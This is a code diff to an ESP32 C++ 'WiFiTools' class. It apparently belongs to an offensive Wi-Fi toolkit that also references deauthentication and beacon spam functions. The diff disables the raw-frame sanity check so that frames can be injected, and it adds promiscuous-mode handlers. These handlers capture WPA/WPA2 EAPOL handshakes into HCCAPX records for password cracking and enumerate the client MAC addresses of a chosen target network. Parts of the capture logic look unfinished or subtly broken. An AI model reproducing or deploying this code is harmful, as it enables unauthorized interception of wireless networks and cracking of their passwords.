@@ -20,6 +20,9 @@ esp_err_t esp_wifi_set_mode(wifi_mode_t mode);
 esp_err_t esp_wifi_start();
 esp_err_t esp_wifi_set_promiscuous(bool en);
 
+// Define the global instance
+WiFiTools* globalWiFiToolsInstance = nullptr;
+
 // Overwrite the function to prevent the sanity check from returning an error allowing the raw frame to be sent
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
@@ -28,6 +31,7 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 // Constructor
 WiFiTools::WiFiTools() {
     // Empty constructor
+    globalWiFiToolsInstance = this;
 }
 
 void WiFiTools::beaconSpamSetup() {
@@ -191,7 +195,7 @@ void WiFiTools::scanWiFiNetworks() {
     Serial.printf("Found %d networks\n", numNetworks);
 
     for (int i = 0; i < numNetworks; i++) {
-        Serial.printf("Network %d: %s, MAC: %s, Channel: %d\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
+        // Serial.printf("Network %d: %s, MAC: %s, Channel: %d\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
         wifi_ap_record_t ap;
         ap.rssi = WiFi.RSSI(i);
         ap.authmode = WiFi.encryptionType(i);
@@ -308,74 +312,93 @@ void WiFiTools::deauthNetwork(uint8_t* networkSSID = NULL, uint8_t* networkBSSID
     Serial.println("WiFi stopped");
 }
 
-void WiFiTools::saveHandshakeData(const std::vector<uint8_t*>& capturedPackets) {
-    // Temp placeholder for saving handshake data
-    Serial.println("Saving handshake data");
-}
-
-void WiFiTools::saveClientData(const std::vector<uint8_t*>& detectedClients) {
-    // Temp placeholder for saving client data
-    Serial.println("Saving client data");
-}
-
-bool WiFiTools::isHandshakePacket(const uint8_t* data, const uint8_t* networkBSSID) {
-    // Check if the packet contains an EAPOL (Extensible Authentication Protocol Over LAN) frame
-    // EAPOL frames are part of WPA/WPA2 handshake packets.
-    const uint16_t eapolFrameType = 0x888E;  // Ethernet type for EAPOL
-    const uint8_t eapolHeaderOffset = 12;    // Offset to Ethernet type field in a packet
-
-    // Compare the Ethernet type field in the packet with EAPOL frame type
-    if (data[eapolHeaderOffset] == (eapolFrameType >> 8) && data[eapolHeaderOffset + 1] == (eapolFrameType & 0xFF)) {
-        // Ensure the BSSID matches the target network
-        return memcmp(data + 10, networkBSSID, 6) == 0;  // BSSID is usually found starting at byte 10
-    }
-
-    return false;
-}
-
-bool WiFiTools::isClientPacket(const uint8_t* data, const uint8_t* networkBSSID) {
-    // Check if the packet is a data frame and if the BSSID matches the target network
-    // Frame control field is the first two bytes (offset 0)
-    uint8_t frameControl = data[0];
-    const uint8_t dataFrameType = 0x08;  // Type/Subtype field for data frames
-
-    // Check for data frame and direction (to DS or from DS)
-    if ((frameControl & 0x0C) == dataFrameType) {
-        // Extract BSSID (position depends on direction of data frame)
-        uint8_t* bssid = nullptr;
-        if ((frameControl & 0x03) == 0x01) {  // To DS
-            bssid = const_cast<uint8_t*>(data + 4);
-        } else if ((frameControl & 0x03) == 0x02) {  // From DS
-            bssid = const_cast<uint8_t*>(data + 10);
+void WiFiTools::filterForClients(const wifi_ieee80211_mac_hdr_t* hdr) {
+    // Check if the packet flag is set to CLIENT_DETECTION
+    if (packetScanFlag == CLIENT_DETECTION) {
+        // Check if the MAC address is already in the list
+        for (auto client : detectedClients) {
+            if (memcmp(hdr->addr2, client, 6) == 0) {
+                return;
+            }
         }
 
-        if (bssid && memcmp(bssid, networkBSSID, 6) == 0) {
-            return true;  // Packet belongs to the specified network
-        }
-    }
+        // Add the MAC address to the list
+        uint8_t* client = new uint8_t[6];
+        memcpy(client, hdr->addr2, 6);
+        detectedClients.push_back(client);
 
-    return false;
+        // DEBUG
+        Serial.printf("Client detected: %02X:%02X:%02X:%02X:%02X:%02X\n", client[0], client[1], client[2], client[3], client[4], client[5]);
+    }
 }
 
-uint8_t* WiFiTools::extractClientMac(const uint8_t* data) {
-    // Extract the source or destination MAC address from a data frame
-    // Offset depends on the frame's direction
-    uint8_t* clientMac = new uint8_t[6];
-    uint8_t frameControl = data[0];
+void WiFiTools::filterForHandshakes(void* buf, wifi_promiscuous_pkt_type_t type) {
+    // Cast the buffer to the Wi-Fi packet structure
+    const wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
+    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)ppkt->payload;
+    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;
 
-    if ((frameControl & 0x03) == 0x01) {         // To DS
-        memcpy(clientMac, data + 10, 6);         // Source MAC address
-    } else if ((frameControl & 0x03) == 0x02) {  // From DS
-        memcpy(clientMac, data + 4, 6);          // Destination MAC address
+    // DEBUG
+    // Serial.println("filterForHandshakes function");
+
+    // Pointer to the payload of the data frame
+    const uint8_t* payload = ipkt->payload;
+
+    // Check for EAPOL packets
+    if (payload[0] == 0x88 && payload[1] == 0x8e) {
+        // DEBUG
+        Serial.println("EAPOL packet detected");
+
+        // Create a new HCCAPX structure
+        HCCAPX hccapx;
+
+        // Copy the AP MAC address
+        memcpy(hccapx.ap_mac, hdr->addr3, 6);
+
+        // Copy the STA MAC address
+        memcpy(hccapx.sta_mac, hdr->addr2, 6);
+
+        // Ensure the EAPOL data length does not exceed the buffer size
+        size_t eapol_len = ppkt->rx_ctrl.sig_len;
+        if (eapol_len > sizeof(hccapx.eapol)) {
+            eapol_len = sizeof(hccapx.eapol);
+        }
+        memcpy(hccapx.eapol, payload, eapol_len);
+        hccapx.eapol_len = eapol_len;
+
+        // Ensure the ESSID length does not exceed the buffer size
+        size_t essid_len = payload[50];
+        if (essid_len > sizeof(hccapx.essid)) {
+            essid_len = sizeof(hccapx.essid);
+        }
+        memcpy(hccapx.essid, payload + 51, essid_len);
+        hccapx.essid_len = essid_len;
+
+        // Extract Replay Counter (offset 7-14 in EAPOL-Key frame)
+        memcpy(hccapx.replay_counter, payload + 7, sizeof(hccapx.replay_counter));
+
+        // Extract Key MIC (offset 81-96 in EAPOL-Key frame)
+        memcpy(hccapx.keymic, payload + 81, sizeof(hccapx.keymic));
+
+        // Add the HCCAPX structure to the captured packets vector
+        // capturedPackets.push_back((uint8_t*)&hccapx);
+
+        // DEBUG
+        Serial.printf("AP MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", hccapx.ap_mac[0], hccapx.ap_mac[1], hccapx.ap_mac[2], hccapx.ap_mac[3], hccapx.ap_mac[4], hccapx.ap_mac[5]);
+        Serial.printf("STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", hccapx.sta_mac[0], hccapx.sta_mac[1], hccapx.sta_mac[2], hccapx.sta_mac[3], hccapx.sta_mac[4], hccapx.sta_mac[5]);
+        Serial.printf("ESSID: %.*s\n", hccapx.essid_len, hccapx.essid);
+        Serial.printf("EAPOL Length: %d\n", hccapx.eapol_len);
     }
-
-    return clientMac;
 }
 
 void WiFiTools::promiscuousPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
+    // DEBUG
+    // Serial.println("promiscuousPacketHandler function");
+
     // Cast the buffer to the Wi-Fi packet structure
-    wifi_promiscuous_pkt_t* packet = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
-    const uint8_t* data = packet->payload;
+    const wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
+    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)ppkt->payload;
+    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;
 
     // Ensure a global or singleton instance of WiFiTools is available
     extern WiFiTools* globalWiFiToolsInstance;  // Declare global instance
@@ -385,29 +408,48 @@ void WiFiTools::promiscuousPacketHandler(void* buf, wifi_promiscuous_pkt_type_t 
 
     WiFiTools* instance = globalWiFiToolsInstance;
 
-    // Process packets for handshake capture or client detection
-    if (instance->isHandshakePacket(data, instance->targetBSSID)) {
-        // Capture handshake packets (allocate memory and copy the packet data)
-        uint8_t* packetCopy = new uint8_t[packet->rx_ctrl.sig_len];
-        memcpy(packetCopy, data, packet->rx_ctrl.sig_len);
-        instance->capturedPackets.push_back(packetCopy);
-    }
+    // Check if the packet's BSSID matches the target BSSID
+    if (memcmp(hdr->addr3, instance->targetBSSID, 6) == 0) {
+        // DEBUG
+        // Serial.println("Packet matches target BSSID");
 
-    if (instance->isClientPacket(data, instance->targetBSSID)) {
-        // Detect client packets (extract client MAC address and copy it)
-        uint8_t* clientMac = instance->extractClientMac(data);
-        instance->detectedClients.push_back(clientMac);
+        // Check if the packet flag is set to CLIENT_DETECTION
+        if (instance->packetScanFlag == CLIENT_DETECTION) {
+            // DEBUG
+            // Serial.println("Filtering for clients");
+
+            // Filter for client MAC addresses
+            instance->filterForClients(hdr);
+        } else if (instance->packetScanFlag == HANDSHAKE_CAPTURE) {
+            // DEBUG
+            // Serial.println("Filtering for handshakes");
+
+            // Filter for handshake packets
+            instance->filterForHandshakes(buf, type);
+        }
     }
 }
 
 void WiFiTools::processWiFiData(uint8_t* networkBSSID, uint8_t channel, int captureTime, bool captureHandshake, bool detectClients) {
     // Set the Wi-Fi channel and enable promiscuous mode
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    // wifi_promiscuous_filter_t filter;
+
+    // // Set the FILTER_MASK to receive the correct packets
+    // if (captureHandshake) {
+    //     filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    // } else if (detectClients) {
+    //     filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
+    // }
+
+    // Set the promiscuous filter
+    // esp_wifi_set_promiscuous_filter(&filter);
+
+    esp_wifi_set_promiscuous_rx_cb(promiscuousPacketHandler);
     esp_wifi_set_promiscuous(true);
 
     uint32_t startTime = millis();
-    std::vector<uint8_t*> capturedPackets;
-    std::vector<uint8_t*> detectedClients;
 
     // Implement logic within a global or static packet handler
     static WiFiTools* instance = this;
@@ -415,27 +457,21 @@ void WiFiTools::processWiFiData(uint8_t* networkBSSID, uint8_t channel, int capt
     // Packet capture loop
     while (millis() - startTime < captureTime) {
         // Processing is handled in the callback
-        delay(10);
+        delay(1);
     }
 
     // Disable promiscuous mode
     esp_wifi_set_promiscuous(false);
 
-    // Save captured data
-    if (captureHandshake) {
-        saveHandshakeData(capturedPackets);
-    }
-    if (detectClients) {
-        saveClientData(detectedClients);
-    }
+    // DEBUG
+    Serial.println("Promiscuous mode disabled");
+    // Serial.printf("Captured %d packets\n", capturedPackets.size());
+    Serial.printf("Detected %d clients\n", detectedClients.size());
 
-    // Free dynamically allocated memory
-    for (auto packet : capturedPackets) {
-        delete[] packet;
-    }
-    for (auto client : detectedClients) {
-        delete[] client;
-    }
+    // Set the packet scan flag to NONE, and captureHandshake and detectClients to false
+    packetScanFlag = NONE;
+    captureHandshake = false;
+    detectClients = false;
 }
 
 void WiFiTools::handshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
@@ -452,6 +488,9 @@ void WiFiTools::handshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel =
         Serial.println("Error: Network information not provided");
         return;
     }
+
+    // Set the packet scan flag to HANDSHAKE_CAPTURE
+    packetScanFlag = HANDSHAKE_CAPTURE;
 
     // DEBUG
     Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
@@ -496,4 +535,34 @@ void WiFiTools::activeHandshakeCapture(uint8_t* networkBSSID = NULL, uint8_t cha
     processWiFiData(targetBSSID, targetChannel, captureTime, true, false);
 
     Serial.println("Handshake capture complete");
+}
+
+void WiFiTools::findClients(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
+    // Check if availableNetworkIndex is provided
+    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
+        // Set the attack variables
+        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
+        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
+    } else if (networkBSSID != NULL && channel != NULL) {
+        // Set the attack variables
+        targetChannel = channel;
+        memcpy(targetBSSID, networkBSSID, 6);
+    } else {
+        Serial.println("Error: Network information not provided");
+        return;
+    }
+
+    // Set the packet scan flag to CLIENT_DETECTION
+    packetScanFlag = CLIENT_DETECTION;
+
+    // DEBUG
+    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
+    Serial.printf("Target Channel: %d\n", targetChannel);
+    Serial.printf("Capture Time: %d\n", captureTime);
+    Serial.println("Starting client detection");
+
+    // Call the processWiFiData function to detect client MAC addresses
+    processWiFiData(targetBSSID, targetChannel, captureTime, false, true);
+
+    Serial.println("Client detection complete");
 }
